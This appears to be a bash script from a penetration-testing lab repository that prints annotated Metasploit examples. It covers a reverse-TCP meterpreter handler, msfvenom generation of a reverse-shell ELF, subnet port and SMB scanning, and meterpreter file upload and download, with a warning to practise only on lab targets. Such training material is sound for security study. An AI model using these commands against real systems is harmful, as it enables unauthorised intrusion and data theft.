#!/usr/bin/env bash
# metasploit/examples.sh — Metasploit Framework: exploitation & post-exploitation
source "$(dirname "$0")/../common.sh"

require_cmd msfconsole "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"
safety_banner

info "=== Metasploit Framework Examples ==="
echo ""

# 1. Start the console
info "1) Start Metasploit console"
echo "   msfconsole"
echo ""

# 2. Search for exploits
info "2) Search for exploits by keyword"
echo "   msf> search type:exploit name:smb"
echo "   msf> search cve:2021"
echo ""

# 3. Use an exploit module
info "3) Select and configure an exploit"
echo "   msf> use exploit/multi/handler"
echo "   msf> set PAYLOAD linux/x64/meterpreter/reverse_tcp"
echo "   msf> set LHOST <your-ip>"
echo "   msf> set LPORT 4444"
echo "   msf> run"
echo ""

# 4. Use an auxiliary scanner
info "4) Port scanning with Metasploit"
echo "   msf> use auxiliary/scanner/portscan/tcp"
echo "   msf> set RHOSTS 192.168.1.0/24"
echo "   msf> set THREADS 10"
echo "   msf> run"
echo ""

# 5. SMB version scanner
info "5) SMB version detection"
echo "   msf> use auxiliary/scanner/smb/smb_version"
echo "   msf> set RHOSTS <target>"
echo "   msf> run"
echo ""

# 6. Database setup (for storing results)
info "6) Initialize the database"
echo "   msfdb init"
echo "   msf> db_status"
echo ""

# 7. Import nmap results
info "7) Import nmap scan results"
echo "   msf> db_import scan-results.xml"
echo "   msf> hosts"
echo "   msf> services"
echo ""

# 8. Generate a payload
info "8) Generate a reverse shell payload"
echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf"
echo ""

# 9. Meterpreter basics
info "9) Common Meterpreter commands"
echo "   meterpreter> sysinfo"
echo "   meterpreter> getuid"
echo "   meterpreter> shell"
echo "   meterpreter> upload /local/file /remote/path"
echo "   meterpreter> download /remote/file"
echo ""

# 10. Resource scripts (automation)
info "10) Run a resource script for automation"
echo "    msfconsole -r my_script.rc"
echo ""

warn "Metasploit is interactive — run 'msfconsole' to start."
warn "Practice against the lab targets (make lab-up) — NEVER against unauthorized systems."
